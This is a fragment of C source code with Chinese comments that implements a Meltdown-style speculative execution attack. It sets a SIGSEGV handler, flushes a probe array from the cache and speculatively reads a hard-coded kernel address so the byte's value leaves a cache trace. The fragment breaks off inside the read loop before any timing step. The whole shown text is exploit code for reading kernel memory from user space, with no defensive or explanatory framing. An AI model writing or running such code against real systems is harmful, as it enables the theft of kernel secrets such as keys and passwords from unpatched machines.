unsigned char probe[256 * 4096];
// 内核目标地址（需根据系统调整，这里假设一个已知地址）
volatile char *kernel_addr = (volatile char*)0xffffffff81000000;

jmp_buf env;

// 信号处理：捕获段错误
void sigsegv_handler(int sig) {
    longjmp(env, 1);
}

// 尝试读取内核地址的字节
char meltdown_read(size_t offset) {
    volatile char *target = kernel_addr + offset;
    int i;

    // 设置信号处理
    signal(SIGSEGV, sigsegv_handler);

    // 多次尝试
    for (int tries = 0; tries < 1000; tries++) {
        // Flush probe数组
        for (i = 0; i < 256; i++) {
            _mm_clflush(&probe[i * 4096]);
        }
        _mm_mfence();

        if (setjmp(env) == 0) {
            // 尝试访问内核地址（会触发异常）
            // 但乱序执行会先读取并影响缓存
            volatile int tmp = probe[*target * 4096];
            // 这行不会执行，因为异常已触发
